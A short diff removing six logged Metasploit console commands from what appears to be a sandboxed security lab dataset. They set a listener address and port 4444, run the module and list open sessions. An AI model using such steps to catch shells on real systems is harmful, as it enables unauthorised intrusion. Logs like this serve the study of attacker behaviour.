@@ -1,6 +1,0 @@
-{"sandbox_id": "156", "timestamp_str": "2019-09-19T10:55:39.223671Z", "cmd_type": "msf-command", "cmd": "set LHOST 10.0.135.83"}
-{"sandbox_id": "156", "timestamp_str": "2019-09-19T10:55:44.305153Z", "cmd_type": "msf-command", "cmd": "run"}
-{"sandbox_id": "156", "timestamp_str": "2019-09-19T10:55:51.360178Z", "cmd_type": "msf-command", "cmd": "sessions -l"}
-{"sandbox_id": "156", "timestamp_str": "2019-09-19T10:57:29.347114Z", "cmd_type": "msf-command", "cmd": "set LPORT 4444"}
-{"sandbox_id": "156", "timestamp_str": "2019-09-19T10:57:32.538743Z", "cmd_type": "msf-command", "cmd": "run"}
-{"sandbox_id": "156", "timestamp_str": "2019-09-19T10:57:48.246042Z", "cmd_type": "msf-command", "cmd": "options"}
